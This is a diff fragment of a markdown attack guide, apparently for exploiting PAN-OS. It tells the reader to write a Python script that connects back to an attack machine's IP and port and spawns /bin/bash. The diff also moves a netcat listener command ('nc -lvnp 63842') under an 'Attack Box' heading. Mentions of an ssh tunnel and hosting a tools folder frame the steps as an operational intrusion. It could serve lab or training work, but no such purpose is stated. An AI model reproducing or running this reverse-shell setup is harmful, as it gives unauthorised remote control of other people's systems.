@@ -66,11 +66,8 @@ ssh -p 4444 localhost   # tunnel to Djibouti
 1. Perform the following command: `nano pan_os_comm`
 2. In nano, copy and paste the below script: **NOTE- BE SURE TO CHANGE THE IP ADDRESS AND PORT IN THE "s.connect(("10.10.100.169", 63842))" LINE TO MATCH THE IP ADDRESS OF YOUR ATTACK MACHINE AND A RANDOM HIGH PORT OF YOUR CHOICE- end note :)** Please remember the random high port you choose as you will have to recall it for use in setting up your initial listener and throwing the export.
 
-#### (ATTACKER MACHINE)
 
-```bash
-nc -lvnp 63842
-```
+
 
 ```python
 #!/usr/bin/env python3
@@ -90,7 +87,10 @@ pty.spawn("/bin/bash")
 
 3. Once created, run the following command: `chmod +x pan_os_comm`
 
-### Create your netcat
+### Create your netcat (Attack Box)
+```bash
+nc -lvnp 63842
+```
 
 ### *Host Your Tools Folder On A Web Server*
 
